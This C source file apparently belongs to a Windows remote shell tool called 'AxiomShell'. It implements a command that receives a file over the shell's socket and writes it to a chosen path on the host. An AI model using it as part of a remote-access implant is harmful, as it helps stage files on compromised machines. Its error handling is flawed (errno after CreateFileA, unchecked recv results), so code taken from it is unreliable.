#include "AxiomShell.h"
#include <winnt.h>
#include <stdio.h>
#include <errno.h>

BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv)
{
	SIZE_T filesize;
	HANDLE hFile;
	CHAR buffer[4096];
	SIZE_T tmplen;
	SIZE_T receivedlen;
	DWORD nbBytes;

	if (argc !=2)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Usage: upload {LOCAL_FILEPATH} {REMOTE_SAVEPATH}\n");
		return (FALSE);
	}

	// First, "request" the file
	JSON_send_packets(JsonReadyForUpload, sock, (void*)argv[0]);

	// ShellClient will allocate the first 8 bytes for packed long long unsigned int
	// representing the size of the file that is to be uploaded
	recv(sock, (char *)&filesize, sizeof(SIZE_T), 0);

	// Open a WRITE-TRUNCATE handle to destination file
	hFile = CreateFileA(
		argv[1],
		FILE_GENERIC_READ | FILE_GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		switch (errno)
		{
			case ENOENT:
				JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] No such file or directory\n");
				break;
			case EACCES:
				JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Permission denied\n");
				break;
			default:
				snprintf(buffer, sizeof(buffer), "[!] Unexpected error opening file for writing (%ld)\n", GetLastError());
				JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
				break;
		}
		return (FALSE);
	}

	// Now write the file, chunk-by-chunk
	receivedlen = 0;
	printf("[+] File to receive is %lld bytes long\n", filesize);
	while (1)
	{
		memset(buffer, 0, sizeof(buffer));
		tmplen = recv(sock, buffer, sizeof(buffer), 0);
		receivedlen += tmplen;
		WriteFile(
			hFile,
			buffer,
			tmplen,
			&nbBytes,
			NULL
		);
		if (receivedlen >= filesize)
			break;
	}

	// Send status notififcation
	snprintf(buffer, sizeof(buffer), "[+] File uploaded ! (%lld bytes written)\n", receivedlen);
	JSON_send_packets(JsonCommandOutput, sock, buffer);
	memset(buffer, 0, sizeof(buffer));

	// All done, close and return
	CloseHandle(hFile);
	return (TRUE);
}

